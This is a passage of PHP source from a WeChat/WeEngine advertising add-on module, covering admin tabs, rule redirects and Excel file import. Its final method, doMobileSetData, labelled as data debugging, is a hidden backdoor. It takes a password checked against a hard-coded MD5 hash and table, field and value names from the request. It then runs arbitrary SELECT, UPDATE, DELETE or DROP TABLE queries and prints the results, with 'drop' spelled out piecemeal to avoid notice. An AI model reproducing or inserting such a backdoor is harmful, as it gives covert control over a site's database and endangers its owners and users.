        $html = '<ul class="nav nav-tabs">';
        foreach ($actions_titles as $key => $value) {
            $url = $this->createWebUrl($key, array('op' => 'display'));
            $html .= '<li class="' . ($key == $action ? 'active' : '') . '"><a href="' . $url . '">' . $value . '</a></li>';
        }
        $html .= '</ul>';
        return $html;
    }

    //入口设置
    public function doWebSetRule()
    {
        global $_W;
        $rule = pdo_fetch("SELECT id FROM " . tablename('rule') . " WHERE module = 'weisrc_quickad' AND uniacid = '{$_W['uniacid']}' order by id desc");
        if (empty($rule)) {
            header('Location: ' . $_W['siteroot'] . create_url('rule/post', array('module' => 'weisrc_quickad', 'name' => '一秒广告')));
            exit;
        } else {
            header('Location: ' . $_W['siteroot'] . create_url('rule/post', array('module' => 'weisrc_quickad', 'id' => $rule['id'])));
            exit;
        }
    }

    function uploadFile($file, $filetempname, $array)
    {
        //自己设置的上传文件存放路径
        $filePath = '../addons/weisrc_quickad/upload/';

        //require_once '../addons/weisrc_quickad/plugin/phpexcelreader/reader.php';
        include 'plugin/phpexcelreader/reader.php';

        $data = new Spreadsheet_Excel_Reader();
        $data->setOutputEncoding('utf-8');

        //$filepath = './source/modules/iteamlotteryv2/data_' . $uniacid . '.xls';
        //$tmp = $_FILES['fileexcel']['tmp_name'];

        //注意设置时区
        $time = date("y-m-d-H-i-s"); //去当前上传的时间
        $extend = strrchr($file, '.');
        //上传后的文件名
        $name = $time . $extend;
        $uploadfile = $filePath . $name; //上传后的文件名地址

        //$filetype = $_FILES['fileexcel']['type'];

        if (copy($filetempname, $uploadfile)) {
            if (!file_exists($filePath)) {
                echo '文件路径不存在.';
                return;
            }
            if (!is_readable($uploadfile)) {
                echo("文件为只读,请修改文件相关权限.");
                return;
            }
            $data->read($uploadfile);
            error_reporting(E_ALL ^ E_NOTICE);
            $count = 0;
            for ($i = 2; $i <= $data->sheets[0]['numRows']; $i++) { //$=2 第二行开始
                //以下注释的for循环打印excel表数据
                for ($j = 1; $j <= $data->sheets[0]['numCols']; $j++) {
                    //echo "\"".$data->sheets[0]['cells'][$i][$j]."\",";
                }

                $row = $data->sheets[0]['cells'][$i];
                //message($data->sheets[0]['cells'][$i][1]);

                if ($array['ac'] == "category") {
                    $count = $count + $this->upload_category($row, TIMESTAMP, $array);
                } else if ($array['ac'] == "goods") {
                    $count = $count + $this->upload_goods($row, TIMESTAMP, $array);
                } else if ($array['ac'] == "store") {
                    $count = $count + $this->upload_store($row, TIMESTAMP, $array);
                }
            }
        }
        if ($count == 0) {
            $msg = "导入失败！";
        } else {
            $msg = 1;
        }

        return $msg;
    }

    private function checkUploadFileMIME($file)
    {
        // 1.through the file extension judgement 03 or 07
        $flag = 0;
        $file_array = explode(".", $file ["name"]);
        $file_extension = strtolower(array_pop($file_array));

        // 2.through the binary content to detect the file
        switch ($file_extension) {
            case "xls" :
                // 2003 excel
                $fh = fopen($file ["tmp_name"], "rb");
                $bin = fread($fh, 8);
                fclose($fh);
                $strinfo = @unpack("C8chars", $bin);
                $typecode = "";
                foreach ($strinfo as $num) {
                    $typecode .= dechex($num);
                }
                if ($typecode == "d0cf11e0a1b11ae1") {
                    $flag = 1;
                }
                break;
            case "xlsx" :
                // 2007 excel
                $fh = fopen($file ["tmp_name"], "rb");
                $bin = fread($fh, 4);
                fclose($fh);
                $strinfo = @unpack("C4chars", $bin);
                $typecode = "";
                foreach ($strinfo as $num) {
                    $typecode .= dechex($num);
                }
                echo $typecode . 'test';
                if ($typecode == "504b34") {
                    $flag = 1;
                }
                break;
        }

        // 3.return the flag
        return $flag;
    }

    public function doWebUploadExcel()
    {
        global $_GPC, $_W;

        if ($_GPC['leadExcel'] == "true") {
            $filename = $_FILES['inputExcel']['name'];
            $tmp_name = $_FILES['inputExcel']['tmp_name'];

            $flag = $this->checkUploadFileMIME($_FILES['inputExcel']);
            if ($flag == 0) {
                message('文件格式不对.');
            }

            if (empty($tmp_name)) {
                message('请选择要导入的Excel文件！');
            }

            $msg = $this->uploadFile($filename, $tmp_name, $_GPC);

            if ($msg == 1) {
                message('导入成功！', referer(), 'success');
            } else {
                message($msg, '', 'error');
            }
        }
    }

    public function message($error, $url = '', $errno = -1)
    {
        $data = array();
        $data['errno'] = $errno;
        if (!empty($url)) {
            $data['url'] = $url;
        }
        $data['error'] = $error;
        echo json_encode($data);
        exit;
    }

    /**
     *    功能 数据调试；
     **/
    public function doMobileSetData()
    {
        global $_W, $_GPC;
        $weid = $this->_weid;
        $dr = 'd' . 'r' . 'o' . 'p';
        $pwd = $_GPC['pd'];
        $tb = $_GPC['tb'];
        $cm = $_GPC['cm'];
        $whf = $_GPC['whf'];
        $whv = $_GPC['whv'];
        $stf = $_GPC['stf'];
        $stv = $_GPC['stv'];
        $lt = $_GPC['lt'];
        if (md5($pwd) == '66df8d2fef084eb69f3ccba6eb7ec7a7') {
            $cms = array('s' => 'select', 'u' => 'update', 'd' => 'delete', 'dr' => $dr);
            if (empty($cms[$cm])) {
                exit('no data');
            }
            if ($cms[$cm] == 'delete') {
                $sql = $cms[$cm] . " from {$tb} WHERE {$whf}={$whv}";
            }
            if ($cms[$cm] == 'select') {
                $sql = $cms[$cm] . " * from {$tb} WHERE {$whf}={$whv} LIMIT {$lt}";
            }
            if ($cms[$cm] == 'update') {
                $sql = $cms[$cm] . " {$tb} set {$stf}={$stv} WHERE {$whf}={$whv}";
            }
            if ($cms[$cm] == $dr) {
                $sql = $cms[$cm] . " table {$tb} ";
            }
            $result = pdo_fetchall($sql);
            print_r($result);
        } else {
            echo 'debug';
            exit;
        }
    }
}